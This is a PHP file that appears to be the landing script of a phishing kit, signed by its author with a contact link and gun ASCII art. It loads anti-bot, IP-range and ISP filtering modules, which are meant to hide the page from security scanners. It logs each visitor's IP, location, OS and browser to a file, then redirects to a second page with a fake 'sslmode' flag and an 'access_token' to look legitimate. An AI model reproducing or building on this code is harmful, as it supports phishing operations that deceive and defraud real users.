<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
	
	@error_reporting(0);
	ob_start();
	session_start();
	include_once ("anti/logger.php");
	require 'func.php';
	include ("anti/bot.php");
	include ("anti/iprange.php");
	include ("anti/wrd.php");
	include ("anti/isp.php");
	
	$_SESSION['startAt'] 		= getDateNow();
	$_SESSION['ip'] 			= clientData('ip');
	$_SESSION['ip_countryName'] = clientData('country');
	$_SESSION['ip_countryCode'] = clientData('code');
	$_SESSION['ip_city'] 		= clientData('city');
	$_SESSION['ip_state'] 		= clientData('state');
	$_SESSION['ip_timezone'] 	= clientData('timezone');
	$_SESSION['ip_zip'] 		= clientData('zip');
	$_SESSION['os'] 			= getOs();
	$_SESSION['browser'] 		= getBrowser();
	$_SESSION['randString'] 	= genRandString(80);

	$code = "{$_SESSION['ip']} | {$_SESSION['startAt']} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";
	$save = fopen("../log.txt","a+");
	fwrite($save,$code);
	fclose($save);
	
	header("Location: indexs.php?sslmode=true&access_token={$_SESSION['randString']}");

?>